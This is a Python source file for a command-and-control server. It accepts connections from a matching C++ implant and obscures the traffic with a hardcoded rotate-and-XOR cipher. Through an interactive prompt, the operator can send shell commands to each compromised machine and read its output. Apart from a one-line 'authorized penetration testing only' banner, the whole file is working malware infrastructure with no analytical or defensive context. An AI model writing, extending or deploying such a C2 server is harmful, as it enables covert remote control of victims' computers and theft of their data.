#!/usr/bin/env python3
import socket
import threading
import time
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

class AdvancedC2Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.clients = []
        self.encryption_key = self.generate_encryption_key()
        
    def generate_encryption_key(self):
        # Mismo algoritmo que el cliente C++
        key = bytearray(32)
        for i in range(32):
            key[i] = (i * 7 + 13) % 256
        return bytes(key)
    
    def encrypt_string(self, data):
        """Implementación Python del cifrado C++"""
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted = bytearray()
        for i in range(len(data)):
            encrypted_byte = data[i]
            # ROTL
            encrypted_byte = ((encrypted_byte << ((i % 7) + 1)) & 0xFF) | (encrypted_byte >> (8 - ((i % 7) + 1)))
            # XOR
            encrypted_byte ^= self.encryption_key[i % len(self.encryption_key)]
            encrypted.append(encrypted_byte)
        return bytes(encrypted)
    
    def decrypt_string(self, encrypted_data):
        """Implementación Python del descifrado C++"""
        decrypted = bytearray()
        for i in range(len(encrypted_data)):
            decrypted_byte = encrypted_data[i]
            # XOR
            decrypted_byte ^= self.encryption_key[i % len(self.encryption_key)]
            # ROTR
            decrypted_byte = (decrypted_byte >> ((i % 7) + 1)) | ((decrypted_byte << (8 - ((i % 7) + 1))) & 0xFF)
            decrypted.append(decrypted_byte)
        return bytes(decrypted).decode('utf-8', errors='ignore')
    
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            print(f"[+] C2 Server started on {self.host}:{self.port}")
            print("[+] Waiting for connections...")
            
            while True:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] New connection from {client_address}")
                
                client_handler = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_handler.daemon = True
                client_handler.start()
                self.clients.append((client_socket, client_address))
                
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            if hasattr(self, 'server_socket'):
                self.server_socket.close()
    
    def handle_client(self, client_socket, client_address):
        try:
            while True:
                # Recibir datos del cliente
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Descifrar y mostrar
                try:
                    decrypted_data = self.decrypt_string(data)
                    print(f"\n[📨 FROM {client_address}]:")
                    print(decrypted_data)
                except Exception as e:
                    print(f"[-] Decryption error: {e}")
                    print(f"[RAW DATA]: {data.hex()}")
                
                # Interfaz de comandos
                while True:
                    command = input(f"\n[💻 C2@{client_address}]> ").strip()
                    
                    if command.upper() == "BACK":
                        break
                    elif command.upper() == "EXIT":
                        client_socket.close()
                        return
                    elif command:
                        # Cifrar y enviar comando
                        encrypted_command = self.encrypt_string(command)
                        client_socket.send(encrypted_command)
                        
                        # Recibir respuesta
                        response = client_socket.recv(8192)
                        if response:
                            try:
                                decrypted_response = self.decrypt_string(response)
                                print(f"\n[📨 RESPONSE]:")
                                print(decrypted_response)
                            except Exception as e:
                                print(f"[-] Response decryption error: {e}")
                        break
                    
        except Exception as e:
            print(f"[-] Client handler error: {e}")
        finally:
            client_socket.close()
            if (client_socket, client_address) in self.clients:
                self.clients.remove((client_socket, client_address))
            print(f"[-] Connection closed: {client_address}")

def main():
    print("""
    🕵️‍♂️ Advanced Windows 11 C2 Server
    🔐 Encrypted Command & Control
    ⚠️  For authorized penetration testing only
    """)
    
    server = AdvancedC2Server()
    server.start_server()

if __name__ == "__main__":
    main()
